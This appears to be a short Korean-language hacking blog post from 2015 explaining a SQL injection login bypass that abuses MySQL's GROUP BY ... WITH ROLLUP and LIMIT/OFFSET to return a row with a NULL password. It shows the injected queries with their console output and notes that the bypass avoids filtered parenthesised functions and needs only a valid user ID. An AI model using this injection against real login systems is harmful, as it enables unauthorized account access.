---
layout: post
title: Group By SQL Injection
date: 2015-08-24 13:45:00 +0900
category: Hacking 
---
```
mysql> select * from member  group by 2 with rollup;

+-------+------+

| id    | pw   |

+-------+------+

| admin | 1234 |

| admin | NULL |

+-------+------+

2 rows in set (0.00 sec)





mysql> select * from user group by 2 with rollup limit 1,2;

+-------+----------+

| id    | password |

+-------+----------+

| admin | NULL     |

+-------+----------+

1 row in set (0.00 sec)

```

이렇게 되면 ()를 쓰는 함수를 쓰지 안아도 우회가 가능하다. 

아이디만 맞으면 로그인이 가능하다. 

rollup함수는 그룹 조건에 따라 컬럼을 그룹화하고 그 데이터의 총합을 구해주는 함수다. 하지만 문자열의 총합을 구하게 되면 

NULL값을 반환하기 때문에 SQL Injection에 악용될수 있다. 





보통 로그인에는 limtit 1이 사용된다. 그렇기 때문에 뒤에 offset 1 을 쓰면 하나는 생략하고 출력한다는 의미다.

이렇게 해도 로그인 우회가 가능하다. 


```
mysql> select * from user group by 2 with rollup limit 1 offset 1;

+-------+----------+

| id    | password |

+-------+----------+

| admin | NULL     |

+-------+----------+

1 row in set (0.00 sec)



mysql>
```




